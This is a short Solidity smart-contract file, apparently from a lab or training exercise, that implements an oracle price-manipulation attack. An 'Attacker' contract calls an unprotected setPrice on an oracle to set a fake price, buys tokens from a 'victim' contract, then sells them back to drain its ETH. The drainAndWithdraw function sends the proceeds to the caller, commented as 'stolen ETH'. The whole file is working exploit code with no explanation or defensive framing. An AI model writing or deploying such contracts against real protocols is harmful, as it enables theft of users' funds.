// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IOracle {
    function setPrice(uint256 _price) external;
}

// Updated Interface to include the new functions
interface IVictim {
    function buyTokens() external payable;
    function sellTokens(uint256 amount) external;
    function balances(address account) external view returns (uint256);
}

contract Attacker {
    IOracle public oracle;
    IVictim public victim;

    constructor(address _oracle, address _victim) {
        oracle = IOracle(_oracle);
        victim = IVictim(_victim);
    }

    function manipulatePrice(uint256 newPrice) public {
        oracle.setPrice(newPrice);
    }

    function attack(uint256 fakePrice) public payable {
        require(msg.value > 0, "Need ETH for attack");
        oracle.setPrice(fakePrice);
        victim.buyTokens{value: msg.value}();
    }

    // --- NEW FUNCTION FOR CASH OUT ---
    function drainAndWithdraw() public {
        // 1. Check how many tokens this contract owns
        uint256 myBalance = victim.balances(address(this));

        // 2. Sell them back to the victim (Drains the ETH)
        victim.sellTokens(myBalance);

        // 3. Send the stolen ETH to YOUR wallet
        payable(msg.sender).transfer(address(this).balance);
    }

    // Needed so contract can receive ETH
    receive() external payable {}
}